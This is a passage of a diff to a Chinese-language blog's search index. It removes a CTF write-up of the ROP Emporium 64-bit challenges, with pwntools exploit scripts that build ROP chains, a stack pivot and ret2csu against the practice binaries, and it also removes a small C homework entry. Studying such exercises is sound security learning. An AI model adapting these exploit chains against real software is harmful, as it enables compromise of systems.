class="string">&#x27;a&#x27;</span>* <span class="number">40</span> + <span class="function"><span class="title">p64</span>(<span class="variable">pop_r14_r15</span>)+<span class="title">p64</span>(<span class="variable">bss</span>+<span class="string">&quot;flag.txt&quot;</span>+<span class="title">p64</span>(<span class="variable">mov_r14_r15</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">pop_rdi</span>) + <span class="title">p64</span>(<span class="variable">bss</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">print_file</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="variable">payload</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">p.interactive</span>() </span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5.badchars"></a>5.badchars</h2><p>与上一题基本一致，不过pwnme函数中添加了一个检查，不允许出现x，a，g，.</p>
-<p>![image-20250214110834422](ROP Emporium（64） WP.assets&#x2F;image-20250214110834422.png)</p>
-<p>仍旧有提供print_file的链接，可以调用这个函数。</p>
-<p>![image-20250214110642874](ROP Emporium（64） WP.assets&#x2F;image-20250214110642874.png)![image-20250214110815887](ROP Emporium（64） WP.assets&#x2F;image-20250214110815887.png)然后我们发现usefulfunction底下还有个usefulgadgets，可以让我们进行异或操作![image-20250214111659502](ROP Emporium（64） WP.assets&#x2F;image-20250214111659502.png)</p>
-<p>那么思路就是对flag.txt字符串进行异或，绕过限制，然后调整r14和r15指针，去逐个异或，然后跳转到print_file</p>
-<p>exp</p>
-<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./badchars&#x27;)</span><br><span class="line"></span><br><span class="line">xor_r14r15 = 0x400628</span><br><span class="line">add_r14r15 = 0x40062c</span><br><span class="line">sub_r14r15 = 0x400630</span><br><span class="line">mov_r12r13 = 0x400634</span><br><span class="line">pop_r12r13r14r15 = 0x40069c</span><br><span class="line">pop_r14r15 = 0x4006a0</span><br><span class="line">pop_rdi = 0x4006a3</span><br><span class="line">write_addr = 0x601030</span><br><span class="line"></span><br><span class="line">badchars = &#x27;xag.&#x27;</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 40</span><br><span class="line">payload += p64(pop_r12r13r14r15) + b&#x27;flbh/tyt&#x27; + p64(write_addr) + p64(1) + p64(write_addr + 2)		</span><br><span class="line">payload += p64(mov_r12r13)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 3)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 4)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 6)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[&#x27;print_file&#x27;])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="6-fluff"><a href="#6-fluff" class="headerlink" title="6.fluff"></a>6.fluff</h2><p>这题和上题唯一的区别就是给的gadget不同，变成了questionableGadgets，底下三个没见过的指令![image-20250214112129447](ROP Emporium（64） WP.assets&#x2F;image-20250214112129447.png)查一下</p>
-<p>xlat指令：将[rbx+al]的值赋值给al</p>
-<p>stosb指令：将al赋值给[rdi]</p>
-<p>bextr：位域索引，第一个源操作数是原数据，第二个源操作数是索引开始位置（8位）和长度，这里可以控制rbx的值</p>
-<p>然后再找到这两个gadget</p>
-<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00000000004006a3</span> : <span class="keyword">pop</span> <span class="built_in">rdi</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x0000000000400639</span> : <span class="keyword">stosb</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span> <span class="comment">; ret</span></span><br></pre></td></tr></table></figure>
-
-<p>能够将寄存器的值赋值到内存中的只有stosb指令，我们有pop rdi; ret的gadget，因此可以控制stosb指令将al的值写到哪里。而xlat可以将内存中的一个值写入al。但首先，我们需要控制rbx的值，这样才能够在内存中寻找正确的字节。而对于rbx，我们又可以使用bextr指令，控制rcx和rdx后，我们可以在rbx中写入任意值。这样就可以通过修改rbx 来修改al。</p>
-<p>exp</p>
-<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">xlat</span> = <span class="number">0x400628</span></span><br><span class="line"><span class="keyword">bextr</span> = <span class="number">0x40062A</span></span><br><span class="line"><span class="keyword">stosb</span> = <span class="number">0x400639</span></span><br><span class="line">zero_seg = <span class="number">0x600fa0</span>			</span><br><span class="line">write_addr = <span class="number">0x601038</span></span><br><span class="line"><span class="built_in">rdi</span> = <span class="number">0x4006A3</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line">char_addr = [<span class="number">0x4003C4</span>, <span class="number">0x4003C1</span>, <span class="number">0x4003D6</span>, <span class="number">0x4003CF</span>, <span class="number">0x4003C9</span>, <span class="number">0x4003D8</span>, <span class="number">0x400246</span>, <span class="number">0x4003D8</span>]</span><br><span class="line">char = [ord(x) for x <span class="keyword">in</span> <span class="string">&#x27;flag.txt&#x27;</span>]</span><br><span class="line">print(char)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(<span class="built_in">rdi</span>) + p64(write_addr)			</span><br><span class="line">payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(zero_seg - <span class="number">0x3EF2</span> - <span class="number">0xb</span>)		</span><br><span class="line">payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(char_addr[<span class="number">0</span>] - <span class="number">0x3EF2</span>)</span><br><span class="line">payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">payload += p64(<span class="keyword">stosb</span>)</span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	payload += p64(<span class="keyword">bextr</span>) + p64(<span class="number">0x2000</span>) + p64(char_addr[i + <span class="number">1</span>] - char[i] - <span class="number">0x3EF2</span>)	</span><br><span class="line">	payload += p64(<span class="keyword">xlat</span>)</span><br><span class="line">	payload += p64(<span class="keyword">stosb</span>)</span><br><span class="line">payload += p64(<span class="built_in">rdi</span>) + p64(write_addr)</span><br><span class="line">payload += p64(elf<span class="number">.</span>plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7.pivot"></a>7.pivot</h2><p>是一道栈迁移的题目</p>
-<p>找到经典usefulgadgets![image-20250214113945044](ROP Emporium（64） WP.assets&#x2F;image-20250214113945044.png)</p>
-<p>通过mov rax, [rax]我们能够控制rax的值，就可以将任意地址的值写入到rax中</p>
-<p>上面的uselessfunction还提供了提供了_foothold_function函数，在so库中查看![image-20250214114742265](ROP Emporium（64） WP.assets&#x2F;image-20250214114742265.png)发现没什么用，但是可以用于延迟绑定后提供该so库的地址泄露</p>
-<p>后门函数同上是ret2win</p>
-<p>所以思路就是覆盖rbp，跳转到leave ret完成迁移，执行_foothold_function函数，打印got表，泄露地址，拿到ret2win的地址，返回pwnme，调用ret2win</p>
-<p>exp</p>
-<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pivot&#x27;)</span><br><span class="line">lib = ELF(&#x27;./libpivot.so&#x27;)</span><br><span class="line"></span><br><span class="line">rax = 0x4009bb</span><br><span class="line">rsp = 0x4009bd</span><br><span class="line">rax_addr = 0x4009c0</span><br><span class="line">add_rax = 0x4009c4</span><br><span class="line">jmp_rax = 0x4007c1</span><br><span class="line">main_addr = 0x400847</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;place to pivot: 0x&#x27;)</span><br><span class="line">stack = int(p.recv(12).decode(), 16)</span><br><span class="line">payload = p64(elf.plt[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax) + p64(elf.got[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax_addr)		</span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(jmp_rax)</span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line">payload = b&#x27;a&#x27;*32	</span><br><span class="line">payload += p64(lib.symbols[&#x27;ret2win&#x27;] - lib.symbols[&#x27;foothold_function&#x27;])	</span><br><span class="line">payload += p64(rax) + p64(stack)	</span><br><span class="line">payload += p64(rsp)						</span><br><span class="line">p.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8.ret2csu"></a>8.ret2csu</h2><p>仍旧有后门函数ret2win![image-20250214132031877](ROP Emporium（64） WP.assets&#x2F;image-20250214132031877.png)只要三个参数符合要求即可</p>
-<p>在这个片段我们可以控制一系列寄存器的值![image-20250214132401399](ROP Emporium（64） WP.assets&#x2F;image-20250214132401399.png)再用ROPgadgets查找![image-20250214132609643](ROP Emporium（64） WP.assets&#x2F;image-20250214132609643.png)</p>
-<p>发现pop rdi; ret实际上是将原来的pop r15指令拆掉了，上面的pop rsi, ret也一样</p>
-<p>第三个函数参数在rdx中保存，但我们没办法rdx，这就用到第二个片段了![image-20250214133130717](ROP Emporium（64） WP.assets&#x2F;image-20250214133130717.png)但是对edi的赋值出现了一点问题，mov edi, r13d只赋值四个字节，高4字节赋值不了，而我们找到一个片段</p>
-<p>它将rsp减8又加8![image-20250214141115280](ROP Emporium（64） WP.assets&#x2F;image-20250214141115280.png)我们试试看，但还需要在内存空间中找到一个保存着这个代码段地址的地方，因为call的地址是取值拿到的，所以不能直接将地址放在寄存器中。我们在IDA中尝试搜索，还真有</p>
-<p>![image-20250214134158024](ROP Emporium（64） WP.assets&#x2F;image-20250214134158024.png)</p>
-<p>这里rbp和rbx都是之前控制的，我们需要让这个跳转不成立，就需要rbx+1&#x3D;&#x3D;rbp的值</p>
-<p>完成之后，再rsp+8，pop6个值之后就是下一个返回地址，这样就可以跳过call直接返回,来修改rdi的值，从这里去修改rdi为目标值，然后跳转去win函数即可。![image-20250214144108583](ROP Emporium（64） WP.assets&#x2F;image-20250214144108583.png)</p>
-<p>exp</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span> = process(&#x27;./ret2csu&#x27;)</span><br><span class="line"><span class="attribute">lib</span> = ELF(&#x27;./libret2csu.so&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">ROP_1</span> = <span class="number">0</span>x40069a</span><br><span class="line"><span class="attribute">ROP_2</span> = <span class="number">0</span>x400680</span><br><span class="line"><span class="attribute">rdi</span> = <span class="number">0</span>x4006a3</span><br><span class="line"><span class="attribute">call</span> = <span class="number">0</span>x400689</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span> = b&#x27;a&#x27;*<span class="number">40</span></span><br><span class="line"><span class="attribute">payload</span> += p64(rdi) + p64(<span class="number">0</span>xdeadbeefdeadbeef)</span><br><span class="line"><span class="attribute">payload</span> += p64(ROP_1)</span><br><span class="line"><span class="attribute">payload</span> += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>x4003B0) + p64(<span class="number">0</span>xdeadbeefdeadbeef) + p64(<span class="number">0</span>xcafebabecafebabe) + p64(<span class="number">0</span>xd00df00dd00df00d)</span><br><span class="line"><span class="attribute">payload</span> += p64(ROP_2)</span><br><span class="line"><span class="attribute">payload</span> += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"><span class="attribute">payload</span> += p64(rdi) + p64(<span class="number">0</span>xdeadbeefdeadbeef) </span><br><span class="line"><span class="attribute">payload</span> += p64(elf.plt[&#x27;ret2win&#x27;])</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.sendlineafter(b&#x27;&gt; &#x27;, payload)</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
-    <title>整数溢出</title>
-    <url>/2024/11/04/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A1/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>虚拟机</title>
     <url>/2024/10/12/%E9%A6%96%E9%A1%B5/</url>
     <content><![CDATA[<h1 id="虚拟机的搭建"><a href="#虚拟机的搭建" class="headerlink" title="虚拟机的搭建"></a>虚拟机的搭建</h1><span id="more"></span>
@@ -335,22 +798,6 @@
 <h2 id="三、搭建结果"><a href="#三、搭建结果" class="headerlink" title="三、搭建结果"></a>三、搭建结果</h2><p><img src="https://p.sda1.dev/19/109c3dac1c57f5c749dd011c95c8f8b1/kali.png"></p>
 <p><img src="https://p.sda1.dev/19/9ac69690bc530b9566822a120b9d490c/ctfos.png"></p>
 <p><img src="https://p.sda1.dev/19/3b52bc0bd23513b9e5d3fbb14371c70e/ub.png"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>编程作业2</title>
-    <url>/2024/11/04/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A2/</url>
-    <content><![CDATA[<h2 id="1、【程序文件名】zy-1-cpp"><a href="#1、【程序文件名】zy-1-cpp" class="headerlink" title="1、【程序文件名】zy-1.cpp"></a>1、【程序文件名】zy-1.cpp</h2><p>【题目描述】编写一个程序，功能是：输入两个整数，变量值交换后输出，输出时两个整数间用一个空格隔开。如输入：12 34，则输出：34 12</p>
-<span id="more"></span>
-
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num1, num2, temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;num1, &amp;num2);</span><br><span class="line">    temp = num1; </span><br><span class="line">    num1 = num2; </span><br><span class="line">    num2 = temp; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, num1, num2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2、【程序文件名】zy-2-cpp"><a href="#2、【程序文件名】zy-2-cpp" class="headerlink" title="2、【程序文件名】zy-2.cpp"></a>2、【程序文件名】zy-2.cpp</h2><p>【题目描述】编写一个程序，功能是：求<br>$$<br>√(|x^3-5| )&#x2F;(e^x+3)。<br>$$<br>。其中，x为浮点数，由键盘输入。计算后输出y的值（显示两位小数)。如输入：3.5，则输出：0.17，输入：-1.2，则输出：0.79。</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">float</span> x, y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;x);</span><br><span class="line">    y = <span class="built_in">sqrt</span>(<span class="built_in">fabs</span>(<span class="built_in">pow</span>(x, <span class="number">3</span>) - <span class="number">5</span>)) / (<span class="built_in">exp</span>(x) + <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>, y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="3、【程序文件名】zy-3-cpp"><a href="#3、【程序文件名】zy-3-cpp" class="headerlink" title="3、【程序文件名】zy-3.cpp"></a>3、【程序文件名】zy-3.cpp</h3><p>【题目描述】编写一个程序，功能是：输入一个年份，判断它是否为闰年。其中，闰年的年份满足以下两个条件之一：一是能被400整除；二是能被4整除，但不能被100整除。如输入：2024，则输出：Y；输入：2022，输出：N。</p>
-<p>  要求：使用条件运算符，不使用if语句。</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;year);</span><br><span class="line">    <span class="type">char</span> isLeapYear = (year % <span class="number">400</span> == <span class="number">0</span> || (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>)) ? <span class="string">&#x27;Y&#x27;</span> : <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, isLeapYear);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
   </entry>
   <entry>
